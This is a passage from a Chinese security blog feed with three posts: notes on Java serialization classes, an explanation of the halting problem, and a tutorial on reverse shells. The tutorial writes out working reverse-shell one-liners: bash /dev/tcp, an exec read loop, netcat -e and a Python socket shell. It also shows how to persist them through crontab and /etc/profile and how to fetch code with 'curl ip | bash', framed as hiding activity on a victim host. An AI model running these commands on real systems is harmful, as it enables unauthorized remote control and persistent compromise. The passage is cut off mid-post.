title="ObjectStreamField"></a>ObjectStreamField</h2><p>依据难度先梳理一下ObjectStreamField这个类。</p><p><code>ObjectStreamField</code>类的实例<strong>描述了序列化的对象中成员属性的元数据信息</strong>，上边的这个方法用于判断当前描述的成员属性是一个基础类型的数据还是一个对象类型的数据，若当前描述的成员属性是基础类型这个函数返回true，反之返回false。该成员函数判断数据类型的方式是使用的签名中的类型代码来判断，前文多次提到类型代码的概念，目前可以知道对象类型的数据只有两种类型代码——数组array【[】和对象object【L】。</p><h3 id="成员属性"><a href="#成员属性" class="headerlink" title="成员属性"></a>成员属性</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** field name */</span> </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String name;                  <span class="comment">//成员属性名称</span></span><br><span class="line"><span class="comment">/** canonical JVM signature of field type */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String signature;             <span class="comment">//成员属性的类型签名</span></span><br><span class="line"><span class="comment">/** field type (Object.class if unknown non-primitive type) */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class&lt;?&gt; type;                <span class="comment">//成员属性的类型</span></span><br><span class="line"><span class="comment">/** whether or not to (de)serialize field values as unshared */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> unshared;             <span class="comment">//属性是否是unshared</span></span><br><span class="line"><span class="comment">/** corresponding reflective field object, if any */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Field field;                  <span class="comment">//当前成员属性的JVM级别的元数据信息，在序列化提取成员属性的元数据信息时，会使用J反射，该成员的类型是java.lang.reflect.Field；</span></span><br><span class="line"><span class="comment">/** offset of field value in enclosing field group */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> offset = <span class="number">0</span>;                     <span class="comment">//偏移量，一个对象的成员属性个数超过一个时，JVM会将会把所有的成员属性打包成一个“组”来操作，而offset就是这个组中当前描述的成员属性的偏移量，上层的ObjectStreamClass在调用当前这个成员属性的时候就使用偏移量进行引用定位操作；</span></span><br></pre></td></tr></table></figure><p>这里梳理一下：<strong>类型，类型代码，类型签名</strong></p><ul><li>类型：类对象的型号，Java的成员属性的类型一般对应的Java数据类型为Class&lt;?&gt;；</li><li>类型代码：类型代码的数据也是用于JVM判断成员属性数据类型的一种方式，但<strong>类型代码的Java数据类型是char</strong>，比如<strong>‘L’</strong>，它一般通过<strong>一个字符</strong>来<strong><em>\</em>判断**</strong>当前的Java数据类型，序列化时它会把这个字符转换成二进制数据；</li><li>类型签名：<strong>类型签名的Java数据类型是一个String类型</strong>，比如：‘Ljava/lang/String;’，它和类型代码一样可以用于JVM判断成员属性的数据类型，但是不仅仅如此，JVM在处理类型签名的时候，针对成员属性、成员函数、类本身都可以使用统一的方式来区分，在JVM里面类型签名相当于类型的唯一标识，它的使用 范围比类型代码更加广阔；</li></ul><h3 id="构造函数-1"><a href="#构造函数-1" class="headerlink" title="构造函数"></a>构造函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectStreamField</span><span class="params">(String name, Class&lt;?&gt; type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(name, type, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectStreamField</span><span class="params">(String name, Class&lt;?&gt; type, <span class="keyword">boolean</span> unshared)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.type = type;</span><br><span class="line">    <span class="keyword">this</span>.unshared = unshared;</span><br><span class="line">    signature = getClassSignature(type).intern();</span><br><span class="line">    field = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里第一个构造函数调用了第二个构造函数，并且给unshared属性赋值为false。</p><p>注意，这里的构造函数<strong>仅仅初始化字段属性，并没有给字段赋值，仅仅是初始化了字段的名称、类型</strong></p><h2 id="ObjectStreamClass"><a href="#ObjectStreamClass" class="headerlink" title="ObjectStreamClass"></a>ObjectStreamClass</h2><p>这个类主要用来<strong>提取序列化过程中某个对象所属类的元数据信息</strong>，对象所属类包含的元数据信息比起它的成员属性包含的元数据信息要复杂许多。</p><h3 id="成员属性-1"><a href="#成员属性-1" class="headerlink" title="成员属性"></a>成员属性</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类的基本信息</span></span><br><span class="line"><span class="keyword">private</span> Class&lt;?&gt; cl;            <span class="comment">// 1. Class</span></span><br><span class="line"><span class="keyword">private</span> String name;            <span class="comment">// 2. cl.getName()</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> Long suid;     <span class="comment">// 3. serialVersionUID</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> isProxy;        <span class="comment">// 4. Proxy.isProxyClass(cl)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> isEnum;         <span class="comment">// 5. Enum.class.isAssignableFrom(cl)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> serializable;   <span class="comment">// 6. Serializable.class.isAssignableFrom(cl)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> externalizable; <span class="comment">// 7. Externalizable.class.isAssignableFrom(cl)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Serializable 接口默认的方法，通过反射调用</span></span><br><span class="line"><span class="keyword">private</span> Constructor&lt;?&gt; cons;            <span class="comment">// 默认的构造函数</span></span><br><span class="line"><span class="keyword">private</span> Method writeObjectMethod;       <span class="comment">// writeObject</span></span><br><span class="line"><span class="keyword">private</span> Method readObjectMethod;        <span class="comment">// readObject</span></span><br><span class="line"><span class="keyword">private</span> Method readObjectNoDataMethod;  <span class="comment">// readObjectNoData</span></span><br><span class="line"><span class="keyword">private</span> Method writeReplaceMethod;      <span class="comment">// writeReplace</span></span><br><span class="line"><span class="keyword">private</span> Method readResolveMethod;       <span class="comment">// readResolve</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> hasWriteObjectData;     <span class="comment">// writeObjectMethod!=null</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// localDesc表示本类的描述信息，superDesc表示父类的描述信息</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass localDesc;    <span class="comment">// this</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamClass superDesc;    <span class="comment">// 父类，superDesc=ObjectStreamClass.lookup(superCl, false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要序列化的字段信息，通过 getSerialFields(c1) 获取</span></span><br><span class="line"><span class="keyword">private</span> ObjectStreamField[] fields;     <span class="comment">// 序列化的字段信息</span></span><br></pre></td></tr></table></figure><p>再提一下lookup方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// false 表示只获取实现了 Serializable 接口的类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ObjectStreamClass <span class="title">lookup</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> lookup(cl, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// true 表示不管是否实现这个接口都提取相关的信息</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ObjectStreamClass <span class="title">lookupAny</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>借用<a href="https://www.cnblogs.com/binarylei/p/10987933.html" target="_blank" rel="noopener">binarylei</a>师傅的图：</p><p><img src="../images/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210716150301931.png" alt="image-20210716150301931"></p><p>每一个序列化结果中，都先包含一段类描述信息，然后才是对象的信息。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浮云游子意，落日故人情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;梳理Java序列化流程。&lt;/p&gt;
&lt;p&gt;参考&lt;a href=&quot;https://www.cnpanda.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;panda&lt;/a&gt;师傅。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java序列化原理" scheme="https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>程序分析理论</title>
    <link href="https://0range228.github.io/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/"/>
    <id>https://0range228.github.io/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/</id>
    <published>2021-06-26T08:32:31.000Z</published>
    <updated>2021-06-28T13:23:50.710Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>开帘顿觉春风暖，满纸淋漓白云声。</p></blockquote><p>梳理程序分析重要又有趣的理论。</p><a id="more"></a><h1 id="理发师悖论"><a href="#理发师悖论" class="headerlink" title="理发师悖论"></a>理发师悖论</h1><p>村庄里有一位理发师，他说“我只给那些不给自己理发的人理发”。随着自己的头发越来越长，他陷入了困境。</p><p>如果他不给自己理发，那么他实际上是不给自己理发的人，他需要给自己理发。</p><p>如果他给自己理发，他就不是那些不给自己理发的人了，他不能为自己理发。</p><h1 id="停机问题"><a href="#停机问题" class="headerlink" title="停机问题"></a>停机问题</h1><p>证明：“计算机不是万能的。”</p><p>最准确&amp;最易懂的<a href>版本</a>；</p><p>假设现在有两台机器 A &amp; C：</p><p>A负责计算两个数的和，例如输入3、5，输出就是8；</p><p>C负责计算棋局下一步的最优解；</p><p><img src="../images/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/image-20210626171558276.png" alt="image-20210626171558276"></p><p>A &amp; C 都泛指正常的计算机程序：接收输入，输出结果。</p><p>对于只要能正常输出结果(不管结果对错)的程序，都可以称为该程序可以<strong>停机</strong>。</p><p>对于程序陷入了死循环等问题，导致迟迟没有结果的输出的局面，那么该程序无法停机。</p><p>比如说A、C互换输入，那么就会导致出现停机。</p><p>这时候我们想有一台上帝的杰作H，H就是传说中的“上帝之眼”，给它读入<strong>任意</strong>一台机器的蓝图，以及任意一个问题（输入）后，它都能根据蓝图模拟出该机器的运作过程，从而判断出哪些问题（输入）会导致该机器<strong>出错</strong>（即无法停机），哪些问题则<strong>不会出错</strong>（即成功<strong>停机</strong>）：</p><p><img src="../images/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/image-20210628093230413.png" alt="image-20210628093230413"></p><p>那么这个H真的存在么？</p><p>接下来逻辑证明<strong>H是不存在</strong>的：</p><p>注意H的大前提是可以为<strong>任意程序蓝图+任意输入判断是否停机</strong>。</p><p>假设现在有一个机器X：</p><p><img src="../images/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/image-20210628093607208.png" alt="image-20210628093607208"></p><p>X由3部分组成：P、H、N</p><p>P负责将输入一分为二；</p><p>H是“上帝之眼”</p><p>N是反转器：</p><ul><li>如果H给出的结果是not stuck，那么N的结果就是stuck；</li><li>如果H给出的结果是stuck，那么N的结果就是not stuck:)</li></ul><p>现在，<strong>如果我们把X自身的蓝图给X</strong>，会发生什么？</p><p>此时H就会对X的蓝图判定，输入是X蓝图的情况下会发生什么？</p><p>如果H给出的是not stuck，那么X最终的输出结果就是stuck，相悖！</p><p>如果H给出的是stuck，那么X最终的结果就是not stuck，相悖！ </p><p>所以X自身就是一个反例，因此逻辑层面就会证明，<strong>世界上根本不存在H</strong>。 </p><h1 id="程序分析技术栈"><a href="#程序分析技术栈" class="headerlink" title="程序分析技术栈"></a>程序分析技术栈</h1><p><a href="https://blog.csdn.net/qq_37206105/article/details/116401043?spm=1001.2014.3001.5501" target="_blank" rel="noopener">canliture师傅</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;开帘顿觉春风暖，满纸淋漓白云声。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;梳理程序分析重要又有趣的理论。&lt;/p&gt;
    
    </summary>
    
    
      <category term="静态分析" scheme="https://0range228.github.io/categories/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    
      <category term="静态分析理论基础" scheme="https://0range228.github.io/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell姿势总结</title>
    <link href="https://0range228.github.io/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
    <id>https://0range228.github.io/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</id>
    <published>2021-06-08T12:01:51.000Z</published>
    <updated>2021-06-15T01:33:20.135Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>曲径通幽处，禅房花木深。</p></blockquote><p> 抽空总结一下nc经典用法以及反弹shell的多种姿势。   </p><a id="more"></a><h1 id="linux文件描述符和重定向"><a href="#linux文件描述符和重定向" class="headerlink" title="linux文件描述符和重定向"></a>linux文件描述符和重定向</h1><p>在反弹shell的时候疑惑，神奇的<code>&amp;、&lt;、&gt;</code>都是用来做什么的？</p><p>没错，他们就是负责将文件描述符重定向的。</p><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>linux跟踪打开的文件，并且分配给他一个数字，这个数字用于充当句柄。</p><p>linux启动的时候会自动启动三个文件描述符：</p><ol><li>stdin 标准输入 0 键盘</li><li>stdout 标准输出 1 显示器</li><li>stderr 错误输出 2 显示器</li></ol><p>之后再打开文件，数字自动递增</p><p>并且所有的shell命令都会默认拥有这三个描述符（0，1，2）</p><p>举个例子，如果我们想要把输出的内容输出到文件中，或者想从文件中读取输入，我们需要的是：</p><p><strong>修改数字 ，将文件描述符重定向。</strong></p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>两种：</p><ol><li>输入重定向 &lt;</li><li>输出重定向 &gt;</li></ol><p>记忆方法：在命令行中，<strong>命令总是在左侧，而重定向符号“指向”数据流动</strong></p><p>默认的重定向会覆盖文件内容，如果想追加 ，可以&lt;&lt; 、&gt;&gt; </p><p>一般0、1、2都写在左侧</p><p>当解析器解析到重定向符号的话，就会先处理重定向。</p><p>就像下面这个小例子：</p><p>输入：输入流默认是0，修改了0的指向，让它指向file.txt，cat自然就会去读标准输入流</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打印文件内容</span><br><span class="line"><span class="keyword">cat</span> 0&lt; <span class="keyword">file</span>.txt</span><br><span class="line"><span class="keyword">cat</span> &lt; <span class="keyword">file</span>.txt</span><br><span class="line">0&lt; <span class="keyword">file</span>.txt <span class="keyword">cat</span></span><br><span class="line">&lt; <span class="keyword">file</span>.txt <span class="keyword">cat</span></span><br></pre></td></tr></table></figure><p>输出：输出流默认是1，修改了1的指向，将输出内容输出到文件file.txt中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">（覆盖）</span></span><br><span class="line">echo hello &gt; file.txt</span><br><span class="line">echo hello 1&gt; file.txt</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> file.txt <span class="built_in">echo</span> hello</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> file.txt <span class="built_in">echo</span> hello</span></span><br></pre></td></tr></table></figure><p>将命令结果输出到文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &amp;&gt; result.txt</span><br><span class="line">ls &amp;&gt; result.txt</span><br></pre></td></tr></table></figure><h3 id="文件描述符的操作"><a href="#文件描述符的操作" class="headerlink" title="文件描述符的操作"></a>文件描述符的操作</h3><p><strong>模糊输出    &gt;&amp;   &lt;&amp;</strong></p><p>正确、错误都输出到同一个地方（1，2）</p><p><strong>文件描述符重定向</strong></p><p>n&lt;&amp;m n&gt;&amp;m</p><p>以上两种模式都是将n复制到m，只不过分别是只读/写，两种模式</p><p><strong>因此对于 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p><p><strong>2&gt;&amp;1</strong>  意思就是把 标准错误输出 重定向到(指向) 标准输出，</p><p><strong>&amp; 目的是为了区分数字名字的文件和文件描述符</strong></p><p>如果没有<code>&amp;</code>，系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><p>那么下面两种命令是等价的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &amp;&gt; result.txt</span><br><span class="line">mkdir &gt; result.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="命令的顺序"><a href="#命令的顺序" class="headerlink" title="命令的顺序"></a>命令的顺序</h3><p>系统读取shell命令永远是从左到右</p><p>顺序不同导致结果不同</p><p>举个例子</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir &gt; result.txt 2&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 首先将标准输出重定向到了result.txt，接下来把标准错误输出指向了标准输出，等量代换，最终就是标准错误输出指向指向result.txt</span></span><br><span class="line">mkdir 2&gt;&amp;1 &gt; result.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 首先将标准错误输出指向了标准输出，接下来又把标准输出指向了result.txt，导致链断掉</span></span><br></pre></td></tr></table></figure><p><strong>exec I/O重定向</strong></p><p>exec命令就是以新的进程去代替原来的进程，但进程的PID保持不变。因此，可以这样认为，exec系统调用并没有创建新的进程，只是替换了原来进程上下文的内容。原进程的代码段，数据段，堆栈段被新的进程所代替。</p><p>举个例子:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec 55&lt;&gt;test.txt # 创建一个新描述符55 该进程所有的输出重定向到result.txt文件下</span><br><span class="line">ls &gt;&amp;55</span><br><span class="line">cat test.txt # 命令都输出在test.txt里面</span><br><span class="line">exec 55&gt;&amp;- # 销毁55号描述符</span><br></pre></td></tr></table></figure><h1 id="NetCat基本用法"><a href="#NetCat基本用法" class="headerlink" title="NetCat基本用法"></a>NetCat基本用法</h1><p>几个重要参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l 开启监听模式</span><br><span class="line">-v 显示详细信息</span><br><span class="line">-vv 显示超级详细信息</span><br><span class="line">-p 本地端口 </span><br><span class="line">-e 程序重定向 -e /bin/sh</span><br></pre></td></tr></table></figure><p>测试环境：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机：A</span><br><span class="line">受害机：B</span><br></pre></td></tr></table></figure><h2 id="正向连接shell"><a href="#正向连接shell" class="headerlink" title="正向连接shell"></a>正向连接shell</h2><p>原理：</p><p>受害主机将bash交付给5555端口，攻击机连接5555端口即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B:nc -lvvp 5555 -e /bin/sh</span><br><span class="line">A:nc [A's IP] 5555</span><br></pre></td></tr></table></figure><h2 id="反向连接shell"><a href="#反向连接shell" class="headerlink" title="反向连接shell"></a>反向连接shell</h2><p>原理：</p><p>攻击机打开自己的6000端口，受害主机主动把自己的shell发送给6000端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lvpp 6000</span><br><span class="line">B:nc [A's IP] 6000 -e /bin/sh</span><br></pre></td></tr></table></figure><h1 id="反弹shell多种姿势"><a href="#反弹shell多种姿势" class="headerlink" title="反弹shell多种姿势"></a>反弹shell多种姿势</h1><h2 id="利用Bash"><a href="#利用Bash" class="headerlink" title="利用Bash"></a>利用Bash</h2><p>先写姿势：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">bash -c "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span><br></pre></td></tr></table></figure><p>之前简单介绍了借助nc来实现，其实bash自己就可以做到发送shell</p><p>Attacker: <code>nc -lvvp 2333</code></p><p>Victim: <code>bash -i &gt;&amp; dev/tcp/[attacker&#39;s ip]/2333 0&gt;&amp;1</code></p><p>一步步看：</p><p><strong>bash -i</strong></p><p>开启交互模式</p><p><strong>/dev/tcp/ip/port</strong></p><p>这是一个十分特殊的文件，直接访问它是不存在的</p><p>但是如果现在有主机A在ip+port监听，那么你对它读写。就可以实现与A的socket通信</p><p>比如:</p><p>攻击机：echo “hello” &gt; /dev/tcp/[attacker’s ip]/6000</p><p>就可以将hello通过socket通信，发送到受害者主机 </p><p>再比如：</p><p>攻击机在<code>nc -lvvp 6000</code>开启本地端口之后，随便在键盘写点东西</p><p>这时候如果受害机<code>cat &lt; /dev/tcp/[attacker&#39;s ip]/6000</code></p><p>就可以看到刚才输入的数字</p><p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609100554103.png" alt="image-20210609100554103"></p><p><strong>bash -i &gt; /dev/tcp/ip/port</strong></p><p>这条命令就是将受害机的输出重定向到ip+port上</p><p>这时候在受害机输入任何命令，结果都会显示在攻击者主机上</p><p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609102002692.png" alt="image-20210609102002692"></p><p><strong>bash -i &lt; /dev/tcp/ip/port</strong></p><p>上一个命令仅仅是接受受害机的输入，将命令结果定向到攻击机。还差点意思</p><p>这条命令就是将受害机输入也重定向到Socket的输入</p><p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609102236985.png" alt="image-20210609102236985"></p><p><strong>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</strong></p><p>现在合二为一，这条命令解释一下就是：</p><p>顺序肯定是从左向右，首先将输出1重定向到socket，然后把输入0定向到1，也就是socket</p><p>这样一来，输入和输出都定向到了socket，也就是/dev/tcp/ip/port</p><p>这样就形成了一个回路，完成了远程shell的交互。</p><p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609104651585.png" alt="image-20210609104651585"></p><p>但是这样在受害机还是能看到有操作痕迹，我们希望”悄无声息”的进行shell交互</p><p>这就需要用到模糊输出，以下两种格式都可以：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line">bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>末尾的<code>0&gt;&amp;1和0&lt;&amp;1</code>除了打开方式不同 在这里没区别 看个人习惯</p><p> 第二个命令里面 <code>&gt;&amp; &amp;&gt;</code>都可以</p><h3 id="借助exec"><a href="#借助exec" class="headerlink" title="借助exec"></a>借助exec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><p>原理：</p><p>新建了一个文件描述符，标号5，让5结合exec重定向到socket</p><p>接下来，将输入设置为5指向的socket</p><p>后半段：<code>while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></p><p>拆开就是:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do $line &gt;&amp;5 2&gt;&amp;1</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>首先从socket中读取一行，复制给line变量</p><p>接下来执行line变量（这一行的内容），然后将结果输出到socket，done结束</p><p>类似的还可以：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p>应用：</p><ol><li><p>配合curl 将一句话写入受害主机的index.php 然后<code>curl ip | bash</code></p></li><li><p>写入crontab定时任务，但是必须知道用户名</p><p>一般来说，一般都是root</p><p>centos：<code>/var/spool/cron/root</code></p><p>debian：<code>/var/spool/cron/crontabs/root</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">每隔一分钟，发送shell</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一句话版本</span></span><br><span class="line">crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -</span><br></pre></td></tr></table></figure></li><li><p>写入<code>/etc/profile</code>配置文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></li></ol><h2 id="利用NetCat"><a href="#利用NetCat" class="headerlink" title="利用NetCat"></a>利用NetCat</h2><p>刚刚提到了，再写一遍：</p><p>受害者主机回连：</p><figure class="highlight 